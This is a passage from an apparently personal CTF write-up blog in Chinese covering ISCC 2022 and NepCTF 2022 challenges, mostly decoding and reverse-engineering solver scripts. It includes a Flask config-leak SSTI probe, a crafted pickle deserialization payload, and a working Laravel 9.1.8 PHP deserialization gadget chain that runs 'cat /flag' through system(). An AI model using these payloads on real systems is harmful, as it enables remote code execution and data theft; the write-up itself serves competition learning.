<p>直接将每个图片的hexo合起来然后hex转字符串，再base64解码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image130.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image132.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{c0de39&amp;c0de128awa}</p>
<h2 id="web">WEB</h2>
<h3 id="melody赛后做出来既然写了就不删了">Melody(赛后做出来，既然写了就不删了)</h3>
<p>扫目录得到info，查看得到提示</p>
<pre><code class="hljs plaintext">?Melody=&#123;&#123;config&#125;&#125;查询密钥</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image136.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">key：meldoy-is-so-cute-wawawa!</code></pre>
<p>然后传入session发现代码</p>
<pre><code class="hljs plaintext"># -*- coding:utf-8 -*-
import pickle
import melody
import base64
from flask import Flask, Response,request

class register:
  def __init__(self,name,password):
      self.name = name
      self.password = password

  def __eq__(self, other):
      return type(other) is register and self.name == other.name and self.password == other.password


class RestrictedUnpickler(pickle.Unpickler):
  def find_class(self, module, name):
      if module[0:8] == &#x27;__main__&#x27;:
          return getattr(sys.modules[&#x27;__main__&#x27;],name)
      raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))

def find(s):
  return RestrictedUnpickler(io.BytesIO(s)).load()

@app.route(&#x27;/therealflag&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])
def realflag():
  if request.method == &#x27;POST&#x27;:
      try:
          data = request.form.get(&#x27;melody&#x27;)
          if b&#x27;R&#x27; in base64.b64decode(data):
              return &#x27;no reduce&#x27;
          else:
              result = find(base64.b64decode(data))
              if type(result) is not register:
                  return &#x27;The type is not correct!&#x27;
          correct = ((result == register(melody.name,melody.password))&amp;(result == register(&quot;melody&quot;,&quot;hug&quot;)))
          if correct:
              if session[&#x27;username&#x27;] == &#x27;admin&#x27;:
                  return Response(read(&#x27;./flag.txt&#x27;))
              else:
                  return Response(&quot;You&#x27;re not admin!&quot;)
      except Exception as e:
          return Response(str(e))

  test = register(&#x27;admin&#x27;, &#x27;123456&#x27;)
  data = base64.b64encode(pickle.dumps(test)).decode()
  return Response(data)</code></pre>
<p>picke反序列化覆盖melody的模板变量，exp如下</p>
<pre><code class="hljs plaintext">import base64

data=b&#x27;&#x27;&#x27;c__main__
melody
(S&#x27;name&#x27;
S&quot;melody&quot;
S&quot;hug&quot;
S&quot;1&quot;
db0(c__main__
register
S&quot;melody&quot;
S&quot;hug&quot;
o.
&#x27;&#x27;&#x27;
print(base64.b64encode(data))
b&#x27;Y19fbWFpbl9fCm1lbG9keQooUyduYW1lJwpTIm1lbG9keSIKUyJodWciClMiMSIKZGIwKGNfX21haW5fXwpyZWdpc3RlcgpTIm1lbG9keSIKUyJodWciCm8uCg==&#x27;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image138.png?x-oss-process=hzy" alt="img"></p>
<p>然后传入得到flag</p>
<p>ISCC{2022_melody_secrets}</p>
<h3 id="ping2rce">Ping2rce</h3>
<p>GoAhead环境变量注入。CVE-2021-42342 GoAhead 远程命令执行漏洞</p>
<p>这里先尝试本地得到回显</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image140.png?x-oss-process=hzy" alt="img"></p>
<p>劫持ping执行过程中环境变量注入</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image142.png?x-oss-process=hzy" alt="img"></p>
<p>得到flag ISCC{c1522169-7dcvd499-4add960-9ad36-8b2a5f2f7}</p>
<h2 id="re">RE</h2>
<h3 id="easyre">easyre</h3>
<p>去花指令后得到main函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image143.png?x-oss-process=hzy" alt="img"></p>
<p>这三个函数分别异或 ，最后和比较^&lt;L^&lt;LX:LX.MJ.MJ9PJ9VF$VF$T@$T]`</p>
<pre><code class="hljs plaintext">key=&#x27;enc!@#key&#x27;
temp=&#x27;^&lt;L^&lt;LX:LX.MJ.MJ9PJ9VF$VF$T@$T];&#x27;

flag=[ord(temp[i]) for i in range(len(temp))]
print(flag)
for j in range(len(flag)):
  flag[j]^=ord(key[6+j%3])
print(1)
for j in range(len(flag)):
  flag[j]-=ord(key[3+j%3])
print(2)
for j in range(len(flag)):
  flag[j]^=ord(key[j%3])
print(3)
for i in range(len(flag)):
  print(chr(flag[i]),end=&#x27;&#x27;)
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image144.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{qwqqwqwqqwereerereeroiooioiooipp}</p>
<h3 id="encode">Encode</h3>
<p>反编译审计</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image146.png?x-oss-process=hzy" alt="img"></p>
<p>这个是先对data xor处理之后去获取密钥然后模运算(模同)，ecp如下</p>
<pre><code class="hljs plaintext">#coding=utf-8
def getInv(a,mod):
  y,x,d=0,0,0
  d = exgcd(a, mod, x, y)
  if d == 1:
      return (x % mod + mod) % mod
  else:
      return -1

def exgcd(a,b,x,y):
  result=0
  if b:
      result = exgcd(b, a % b, y, x)
      y -= a / b * x
  else:
      x = 1
      y = 0
      return a
  return result

key =[0]*10
key[0],key[1],key[2] =[0x7,0xb,0xd]
key[3] = key[1] * key[0]
key[4] = (key[1] - 1) * (key[0] - 1)
key[5] = getInv(key[2], key[4])
print (key)
# 输出key值

data=[0]*24

t=[0x23,0x4A,0x7,0x2B,0x1D,0x6,0x3F,0x36,0x36,0x2B,0x5,0x7,0x6,0x39,0x2,0x6,0x38,0x21,0x4B,0x1A,0x2D,0x2D,0x39,0x2]
#t=&#x27;0x363F061D2B074A230x0602390607052B360x02392D2D1A4B2138&#x27;
for i in range(24):
  for j in range(1,1000):
      if t[i]==pow(j,key[2],key[3]):
          data[i] = j
          break

print (data)
# 输出key值

# bagin——flag
for i in range(len(data)):
  data[i]+=70
  data[i]^=0x3f

len_=len(data)
for i in range((len(data)%2+len(data))//2,-1,-1):
  data[len_-i-1]^=data[i]
  data[i]^=data[len_-i-1]
  data[len_-i-1]^=data[i]

flag=&#x27;&#x27;
for i in range(len_):
  flag+=chr(data[i]^0xf)

print (flag)
# 输出flag</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image148.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{PWN_ISR_EALLY_HARD}</p>
<h3 id="self-reverse">Self-Reverse</h3>
<p>分析一下伪代码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image150.png?x-oss-process=hzy" alt="img"></p>
<p>需要动态调试一下，关键代码如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image152.png?x-oss-process=hzy" alt="img"></p>
<p>exp如下</p>
<pre><code class="hljs plaintext">t= [250,12,229,250,145,157,100,166,108,250,247,145,12,12,99,142] 
t1=[0]*16
for i in range(16):
  for j in range(0,256):
      # 爆破映射后数组,
      v34=3*j+1
      if ((v34&gt;&gt;8)+v34)- (v34&gt;&gt;8)&amp;0xff==t[i]:
          # 只取8位 &amp;0xff 要在最外层
          t1[i]=j
          break
      if j==127:
          print (j)
print (t1)
# 映射flag
flag=[0]*16
for i in range(16):   # 映射出flag
  flag[(i+1)%16]=t1[i^0xd]

for i in range(16):
  print(chr(flag[i]),end=&#x27;&#x27;)
  # 输出flag
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image154.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{LYY/vSy0R407!YSS}</p>
<h3 id="rerere">rerere</h3>
<p>看了伪代码之后发现还是动态调试–下断点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image156.png?x-oss-process=hzy" alt="img"></p>
<p>调试的图失踪了，附件也召唤不到了，exp如下:</p>
<pre><code class="hljs plaintext">CCC=[0xD7, 0x00, 0xB5, 0x00, 0xB8, 0x00, 0x7A, 0x00, 0x47, 0x00,
0x8B, 0x00, 0x46, 0x00, 0xFF, 0x00, 0x5C, 0x00, 0xB5, 0x00,
0x04, 0x00, 0x32, 0x00, 0xE3, 0x00, 0x5A, 0x00, 0x7B, 0x00,
0x28, 0x00, 0x30, 0x00, 0x2D, 0x00, 0x5A, 0x00, 0xF3, 0x00,
0x59, 0x00, 0x59, 0x00, 0xA4, 0x00, 0x54, 0x00, 0xC8, 0x00,
0x79, 0x00, 0xA2, 0x00, 0xDC, 0x00, 0x6F, 0x00, 0x74, 0x00,
0x1F, 0x00, 0x9D]
# 遍历输出
XXX=[0x9E, 0x00, 0xE6, 0x00, 0xFB, 0x00, 0x39, 0x00, 0x3C, 0x00,
0xEA, 0x00, 0x24, 0x00, 0x9C, 0x00, 0x38, 0x00, 0xD0, 0x00,
0x62, 0x00, 0x55, 0x00, 0x8B, 0x00, 0x33, 0x00, 0x11, 0x00,
0x43, 0x00, 0x5C, 0x00, 0x40, 0x00, 0x34, 0x00, 0x9C, 0x00,
0x29, 0x00, 0x28, 0x00, 0xD6, 0x00, 0x27, 0x00, 0xBC, 0x00,
0x0C, 0x00, 0xD4, 0x00, 0xAB, 0x00, 0x17, 0x00, 0x0D, 0x00,
0x65, 0x00, 0xE0, 0x00]



flag=&#x27;
#flag


for i in range(0,len(XXX),2):
  print(chr(XXX[i]^CCC[i]),end=&quot;&quot;)  
#输出flag
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image158.png?x-oss-process=hzy" alt="img"></p>
<p>ISCC{abcdefghijklmnopqrstuvwxyz}</p>
<h2 id="mobile">MOBILE</h2>
<h3 id="easy-mobile">Easy Mobile</h3>
<p>反编译头部设卡，改成35得到伪代码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image159.png?x-oss-process=hzy" alt="img"></p>
<p>得到关键代码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image161.png?x-oss-process=hzy" alt="img"></p>
<p>分析主题逻辑</p>
<pre><code class="hljs plaintext">public final void onCreate(Bundle paramBundle) &#123;
  super.onCreate(paramBundle);
  setContentView(2131427356);
  this.n = (Button)findViewById(2131230808);
  this.o = (EditText)findViewById(2131230872);
  this.n.setOnClickListener(new a(this));
&#125;
 
public final class a implements View.OnClickListener &#123;
  public a(MainActivity this$0) &#123;&#125;
   
  public final void onClick(View param1View) &#123;
    String str = this.a.o.getText().toString();
    this.a.p = str;
  &#125;
&#125;
&#125;</code></pre>
<p>得到flag</p>
<p>ISCC{W72Eb7Lf9CecO-9M87Ed-T46O4fD-bL23U0-SaaEe5C87dc2540}</p>
<h3 id="mobile-analysis">Mobile Analysis</h3>
<p>反编译得到代码，审计之后梳理主体逻辑，看到a.class</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image163.png?x-oss-process=hzy" alt="img"></p>
<p>参数写码表，然后再看c.class</p>
<pre><code class="hljs plaintext">AjmBCL7DHxIMl4P5Wa=uzvt0ZTfpnoRSJNO9/QYqrsb2U1cdeEFGVXy3ghikKw68</code></pre>
<p>执行得到结果。</p>
<p>class b的逻辑分析之后解密得到答案，最后Main activity解密排序之后得到flag</p>
<h3 id="好玩的是新语言哦">好玩的？是新语言哦</h3>
<p>刚开始同第一个，设卡改值，逆出代码，找到重要代码ISCC</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image165.png?x-oss-process=hzy" alt="img"></p>
<p>加密逻辑如下</p>
<pre><code class="hljs plaintext">for (j = 0; j &lt; k; j++) &#123;
  byte b = arrayOfByte1[j];
  if (97 &lt;= b &amp;&amp; b &lt; 103) &#123;
    paramInt = 1;
  &#125; else &#123;
    paramInt = 0;
  &#125; 
  if (paramInt != 0) &#123;
    paramInt = b - 87;
  &#125; else &#123;
    if (48 &lt;= b &amp;&amp; b &lt; 58) &#123;
      paramInt = 1;
    &#125; else &#123;
      paramInt = 0;
    &#125; 
    if (paramInt != 0) &#123;
      paramInt = b - 48;
    &#125; else &#123;
      paramInt = 0;
    &#125; 
  &#125;</code></pre>
<p>理清主体逻辑</p>
<pre><code class="hljs plaintext">if (activityMainBinding3 == null) &#123;
  Intrinsics.throwUninitializedPropertyAccessException(&quot;viewBinding&quot;);
  activityMainBinding1 = null;
&#125; 
setContentView((View)activityMainBinding1.getRoot());
activityMainBinding1 = this.viewBinding;
if (activityMainBinding1 == null) &#123;
  Intrinsics.throwUninitializedPropertyAccessException(&quot;viewBinding&quot;);
  activityMainBinding1 = activityMainBinding2;</code></pre>
<p>之后得到flag(flag找不到了，这是赛后才写的这道题的wp)</p>
<h1 id="解题收获">解题收获</h1>
<p>79名</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230125194455970.png?x-oss-process=hzy" alt="image-20230125194455970"></p>
<p>​    首先不论是什么类型的题目，我发现最重要的还是基础，要掌握好基础知识才能在比赛过程中得心应手，其次就是脑洞要扩散点，不能太狭隘，思路要敢想！敢做！</p>
<p>​    做web题目的时候更是考验基础2，这web题目都比较综合，一个题可能要打很多组合拳才能成功解出，其次还有就是多利用网络，多搜多找多学。</p>
<p>​    misc题目的话更是最需要扩散思维的，真的很多题目在写的时候想不到会这样，在反复思考和尝试之后成功解出来的时候真的是恍然大悟，也能感觉到自己的思路没有打开，所以在misc题目的时候要丰富想象力。</p>
<p>​    reverse题目和pwn题目关系比较密切，这类题型比较考察底层编程能力，同时还有就是调试，静动态，以及下断点等等基础本领，同时需要仔细地审计代码之间的逻辑关系，发现相应破绽然后写出对应脚本</p>
<p>​    最后这个mobile，之前不咋涉及这方面但是通过这次比赛，真的是又学习到了很多，首先就是这个反编译出代码的能力，以及apktool，dex2jar-2.0，jd-gui-windows-1.6.6这三个软件的熟练运用，在解这方向题目的时候第一步基本都是反编译出代码，然后就是考验审计能力了，其大致后面的解法基本和reverse就相似了。</p>
<p>​    通过这次iscc长达二十五天的比赛，让我学到了很多，其中mobile这个领域更是受益匪浅，同时让我见到了很多之前没有见过的题型，对于自己的技术可以说是提高了不少！</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NepCTF 2022</title>
    <url>/2022/07/17/NepCTF/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207171311928.png" alt="image-20220717131146861"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>打了三天的NepCTF，还是有收获的，都是挺有意思的题目，终究是我太菜，师傅们都太卷了，敌不过你们</p>
<p><img src="http://img.hzy2003628.top/202207171314613.png" alt="image-20220717131457543"></p>
<h1 id="misc">misc</h1>
<h2 id="花花画画画花花">花花画画画花花</h2>
<blockquote>
<p>花花画了一张图，你能看出来她画的是什么吗</p>
</blockquote>
<p>下载附件发现是.osz文件，是 <code>osu!</code> 的一个谱面压缩文件，下载osu!软件然后附件拖进去</p>
<p><img src="http://img.hzy2003628.top/202207151849807.png" alt="image-20220715184927423"></p>
<p>启动osu!，进入到edit模式，一点一点放，这里放个图吧</p>
<p><img src="http://img.hzy2003628.top/202207151850888.jpg" alt="img"></p>
<p>最后拼接一下就是flag</p>
<p>NepCTF{MASTER_OF_坏女人！}</p>
<h2 id="签到题">签到题</h2>
<blockquote>
<p>极限套娃</p>
</blockquote>
<p>附件就是套娃，刚开始出的那个套一半就卡住了，后来主办方降低难度了，新的附件有思路，就是简单的套娃</p>
<p><img src="http://img.hzy2003628.top/202207151852447.png" alt="image-20220715185253401"></p>
<p>解压脚本如下</p>
<pre><code class="hljs plaintext">import zipfile
import re

zipname = &quot;C:\\Users\\25963\\Desktop\\新\\xxx\\232\\231\\&quot;+&quot;230.zip&quot;

while True:
    if zipname[len(zipname)-4:] == &quot;.zip&quot;:
        pzip = zipfile.ZipFile(zipname)
        res = re.search(&#x27;[0-9]*&#x27;,pzip.namelist()[0])
        print(res.group())
        password = res.group()
        password = password.encode(&#x27;ascii&#x27;)
        pzip.extractall(&quot;D:\\developer\\python_shell\\zip&quot;,pwd=password)
        zipname = &quot;D:\\developer\\python_shell\\zip\\&quot;+pzip.namelist()[0]
    else:
        print(&quot;end&quot;)</code></pre>
<p><img src="http://img.hzy2003628.top/202207151853959.png" alt="image-20220715185354913"></p>
<p>发现是伪加密，直接用winrar修复</p>
<p><img src="http://img.hzy2003628.top/202207151854403.png" alt="image-20220715185440337"></p>
<p>流量分析发现是usb流量</p>
<p>筛选流量</p>
<pre><code class="hljs plaintext">usb.transfer_type == 0x01 and usb.src == &quot;1.5.1&quot;</code></pre>
<p><img src="http://img.hzy2003628.top/202207171252266.png" alt="image-20220717125234184"></p>
<p>导出之后上kali</p>
<pre><code class="hljs plaintext">tshark -r 2.pcap -T fields -e usb.capdata &gt; usbdata.txt</code></pre>
<p><img src="http://img.hzy2003628.top/202207171253683.png" alt="image-20220717125332637"></p>
<p>利用脚本加上冒号</p>
<pre><code class="hljs plaintext">f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)
fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)
while 1:
    a=f.readline().strip()
    if a:
        if len(a)==16: # 键盘流量len=16，鼠标流量len=8
            out=&#x27;&#x27;
            for i in range(0,len(a),2):
                if i+2 != len(a):
                    out+=a[i]+a[i+1]+&quot;:&quot;
                else:
                    out+=a[i]+a[i+1]
            fi.write(out)
            fi.write(&#x27;\n&#x27;)
    else:
        break

fi.close()</code></pre>
<p><img src="http://img.hzy2003628.top/202207171254237.png" alt="image-20220717125428182"></p>
<p>键盘流量上脚本</p>
<pre><code class="hljs plaintext">normalKeys = &#123;
    &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;,
    &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;,
     &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;,
      &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;,
       &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;,
        &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;,
         &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,
         &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,
         &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,
         &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,
         &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,
         &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,
         &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
shiftKeys = &#123;
    &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;,
     &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;,
      &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;,
       &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;,
        &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;,
         &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;,
          &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,
          &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,
          &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,
          &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,
          &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,
          &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
output = []
keys = open(&#x27;out.txt&#x27;)
for line in keys:
    try:
        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:
             continue
        if line[6:8] in normalKeys.keys():
            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]
        else:
            output += [&#x27;[unknown]&#x27;]
    except:
        pass

keys.close()

flag=0
print(&quot;&quot;.join(output))
for i in range(len(output)):
    try:
        a=output.index(&#x27;&lt;DEL&gt;&#x27;)
        del output[a]
        del output[a-1]
    except:
        pass

for i in range(len(output)):
    try:
        if output[i]==&quot;&lt;CAP&gt;&quot;:
            flag+=1
            output.pop(i)
            if flag==2:
                flag=0
        if flag!=0:
            output[i]=output[i].upper()
    except:
        pass

print (&#x27;output :&#x27; + &quot;&quot;.join(output))</code></pre>
<p><img src="http://img.hzy2003628.top/202207171255597.png" alt="image-20220717125520549"></p>
<p>nepctf{welcometonepctf2nd}</p>
<h2 id="9点直播">9点直播</h2>
<p>老老实实看直播，听出题人说有多么简单，然后拿到flag</p>
<p><img src="http://img.hzy2003628.top/202207152151343.png" alt="image-20220715215119009"></p>
<p>NepCTF{bad_woman_nb!}</p>
<h2 id="少见的bbbbase">少见的bbbbase</h2>
<blockquote>
<p>少见的bbbbase</p>
</blockquote>
<p>附件是个jpg，用Jphswin，无密码，直接导出base加密的flag</p>
<p><img src="http://img.hzy2003628.top/202207152248043.png" alt="image-20220715224825979"></p>
<p>base58解码得到明文flag</p>
<p>flag{Real_qiandao~}</p>
<h2 id="馅饼陷阱">馅饼？陷阱！</h2>
<blockquote>
<p>好兄弟中奖了，但是要先汇款。他去哪了？</p>
<p>NepCTF{银行官网网址}</p>
</blockquote>
<p>有一个车牌号琼，是海南省</p>
<p><img src="http://img.hzy2003628.top/202207171028032.png" alt="image-20220717102824970"></p>
<p>结合东北饺子城，百度地图搜索得到对面就是那个银行</p>
<p><img src="http://img.hzy2003628.top/202207162114733.png" alt="image-20220716211423856"></p>
<p>银行是光大银行</p>
<p>NepCTF{<a href="http://www.cebbank.com">www.cebbank.com</a>}</p>
<h2 id="问卷">问卷</h2>
<p>填问卷给flag</p>
<p><img src="http://img.hzy2003628.top/202207170946815.png" alt="image-20220717094619764"></p>
<p>NepCTF{see_you_NepCTF_2023}</p>
<h1 id="re">re</h1>
<h2 id="快来签到">快来签到</h2>
<p>下载附件，ida32，打开之后修改最大节点数为9999，得到flag</p>
<p><img src="http://img.hzy2003628.top/202207152201977.png" alt="image-20220715220158915"></p>
<p>NepCTF{welc0me_t0_nepctf}</p>
<h1 id="web">web</h1>
<h2 id="just-kidding">Just Kidding</h2>
<blockquote>
<p>顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207152338523.png" alt="image-20220715233829454"></p>
<p>没发现啥，www.zip是源码泄露，链子是Laravel 9.1.8</p>
<p><img src="http://img.hzy2003628.top/202207152338293.png" alt="image-20220715233815201"></p>
<p>反序列化漏洞，poc如下</p>
<pre><code class="hljs plaintext">&lt;?php

namespace Faker &#123;
    class Generator &#123;
        protected $providers = [];
        protected $formatters = [];
        function __construct() &#123;
            $this-&gt;formatter = &quot;dispatch&quot;;
            $this-&gt;formatters = 9999;
        &#125;
    &#125;
&#125;

namespace Illuminate\Broadcasting &#123;
    class PendingBroadcast &#123;
        public function __construct() &#123;
            $this-&gt;event = &quot;cat /flag&quot;;
            $this-&gt;events = new \Faker\Generator();
        &#125;
    &#125;
&#125;

namespace Symfony\Component\Mime\Part &#123;
    abstract class AbstractPart &#123;
        private $headers = null;
    &#125;

    class SMimePart extends AbstractPart &#123;
        protected $_headers;
        public $h3rmesk1t;
        function __construct() &#123;
            $this-&gt;_headers = [&quot;dispatch&quot;=&gt;&quot;system&quot;];
            $this-&gt;h3rmesk1t = new \Illuminate\Broadcasting\PendingBroadcast();
        &#125;
    &#125;
&#125;


namespace &#123;
    $pop = new \Symfony\Component\Mime\Part\SMimePart();
    $ser = preg_replace(&quot;/([^\&#123;]*\&#123;)(.*)(s:49.*)(\&#125;)/&quot;,&quot;\\1\\3\\2\\4&quot;,serialize($pop));
    echo base64_encode(str_replace(&quot;i:9999&quot;,&quot;R:2&quot;,$ser));
&#125;
</code></pre>
<p><img src="http://img.hzy2003628.top/202207152340140.png" alt="image-20220715234022070"></p>
<p>NepCTF{e3edfaa0-e66e-4c7b-8c0b-e1cde5c7c40a}</p>
<h2 id="challenger">Challenger</h2>
<blockquote>
<p>顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭</p>
<p>（flag在根目录下: /flag）</p>
</blockquote>
<p>下附件，分析路由，Thymeleaf模板注入</p>
<p><img src="http://img.hzy2003628.top/202207160057751.png" alt="image-20220716005743688"></p>
<p>get传payload如下</p>
